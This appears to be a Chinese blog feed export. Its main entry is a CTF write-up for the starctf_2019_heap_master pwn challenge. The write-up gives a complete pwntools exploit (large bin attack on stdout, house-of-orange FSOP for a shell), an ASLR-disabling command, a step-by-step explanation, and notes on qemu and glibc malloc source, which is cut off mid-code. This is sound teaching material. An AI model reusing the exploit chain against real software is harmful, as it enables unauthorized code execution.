<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">_IO_2_1_stdout_s = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里用lambda表达式我的机器会过不了交互</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset,size,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">offset</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</span></span><br><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s + <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>打本地的时候<code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0</span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 485)</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span> (pid 483)</span><br></pre></td></tr></table></figure>

<h4 id="exp拆分讲解"><a href="#exp拆分讲解" class="headerlink" title="exp拆分讲解"></a>exp拆分讲解</h4><h5 id="在heapbase布局堆内存"><a href="#在heapbase布局堆内存" class="headerlink" title="在heapbase布局堆内存"></a>在heapbase布局堆内存</h5><p>布局了0x421,0x431,0x91大小的堆内存，其他的0x21是用来隔离的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<h5 id="将第一个chunk放入largebin中"><a href="#将第一个chunk放入largebin中" class="headerlink" title="将第一个chunk放入largebin中"></a>将第一个chunk放入largebin中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br></pre></td></tr></table></figure>

<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h5><p>largebin_attack就要对large_chunk的bk和bk_nextsize进行修改，这道题目中我们可以不断的通过edit()对heap_base那块内存进行修改和利用 unsortedbin 机制留下libc地址，而我们知道在unsortedbin中只有一个chunk时，必定会在这个chunk的bk，fd上留下libc的地址，所以我们要对这个large_chunk进行修改使它经过多次free()的机制留下libc地址</p>
<p>接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</p>
<blockquote>
<p>这里为什么留下libc的地址呢？</p>
<p>因为我们要劫持_IO_2_1_stdout_，它也是libc中的地址也在main_arena中，而且低3位是不会变化的，所以我们可以通过低字节覆盖，这样就只剩下一位需要爆破，概率1&#x2F;16</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br></pre></td></tr></table></figure>

<p>覆盖率写在chunk0的libc地址的低字节，使flags字段位于addr1-&gt;fd，错位覆盖的方法使_IO_write_base的最低一字节为<code>\x00</code>，而我们的堆地址偏移设置的正好为<code>~880</code>（满足了hijack stdout的两个条件），通过那一位的爆破（或者重复运行exp）使chunk0-&gt;bk指向stdout就可以实现hijack stdout</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<h5 id="地址计算"><a href="#地址计算" class="headerlink" title="地址计算"></a>地址计算</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br></pre></td></tr></table></figure>

<h5 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h5><p>利用house_of_orange来get shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="新版largebin-attack"><a href="#新版largebin-attack" class="headerlink" title="新版largebin_attack"></a>新版largebin_attack</h2><p><a href="https://blog.csdn.net/yjh_fnu_ltn/article/details/141569981?spm=1001.2014.3001.5502">Large Bin Attack 源码调试</a></p>
<h2 id="总结-large-bin-attack-的利用方法"><a href="#总结-large-bin-attack-的利用方法" class="headerlink" title="总结 large bin attack 的利用方法"></a>总结 large bin attack 的利用方法</h2><p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件（ctf-wiki）：</p>
<ul>
<li>可以修改一个 large bin chunk 的 data</li>
<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
<li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li>
<li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106699487">ha1vk</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>/lib/ld-linux-armhf.so.3: No such file or directory</title>
    <url>/2025/07/15/libld-linux-armhf.so.3%20No%20such%20file%20or%20directory%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h1 id="ubuntu-执行-arm-程序显示：-lib-ld-linux-armhf-so-3-No-such-file-or-directory"><a href="#ubuntu-执行-arm-程序显示：-lib-ld-linux-armhf-so-3-No-such-file-or-directory" class="headerlink" title="ubuntu 执行 arm 程序显示：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory"></a>ubuntu 执行 arm 程序显示：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory</h1><ol>
<li>运行arm文件xxx，报错 <strong>&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory</strong></li>
<li>安装 libc6-armhf-cross，<code>sudo apt-get install libc6-armhf-cross</code>, 成功后会有目录 <code>/usr/arm-linux-gnueabihf</code> 文件夹</li>
<li>安装 qemu，<code>sudo apt install qemu</code>（可忽略）</li>
<li>指定 lib 环境运行，qemu-arm -L &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F; .&#x2F;xxx</li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>glibc源码阅读</title>
    <url>/2025/04/22/glibc%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    <content><![CDATA[<p>目标：</p>
<ul>
<li>做出malloc导图</li>
<li>理解largebin_attack等攻击利用</li>
<li></li>
</ul>
<h1 id="malloc-c"><a href="#malloc-c" class="headerlink" title="malloc.c"></a>malloc.c</h1><h2 id="malloc-assert"><a href="#malloc-assert" class="headerlink" title="__malloc_assert"></a>__malloc_assert</h2><p>__int_malloc()函数的断言，一个用于处理断言失败的 C 语言宏和函数实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;<span class="comment">//声明一个外部变量 __progname，它存储程序的名称。</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span><span class="comment">//静态函数 __malloc_assert，用于处理断言失败的情况。因为它是静态的，所以它只能在当前文件中被访问。</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);<span class="comment">//刷新标准错误流</span></span><br><span class="line">  <span class="built_in">abort</span> ();<span class="comment">//函数被调用以异常终止程序执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><strong>代码总结</strong></p>
<ul>
<li>此代码块定义了一个断言失败时的处理机制：<ul>
<li>在程序的调试版本中，如果某个断言失败，<code>__assert_fail</code> 宏会被调用。</li>
<li>宏调用 <code>__malloc_assert</code>，该函数会生成详细的错误信息，并将其输出到标准错误流，然后终止程序。</li>
</ul>
</li>
<li>由于整个处理是通过宏和函数来完成的，因此提供了灵活性和可读性，便于在需要时进行调试，而在发布版本中可以通过定义 <code>NDEBUG</code> 来禁用这些检查。</li>
</ul>
<h2 id="USE-TCACHE"><a href="#USE-TCACHE" class="headerlink" title="USE_TCACHE"></a>USE_TCACHE</h2><p>tcache的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.定义了 tidx2usize 宏，这个宏用于将bin的idx转换为相应的字节大小。*/</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().定义了 csize2tidx 宏，将一个给定的chunk大小 x 转换为对应的bin idx。 */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="comment">//tcache 中最多 7 个</span></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span 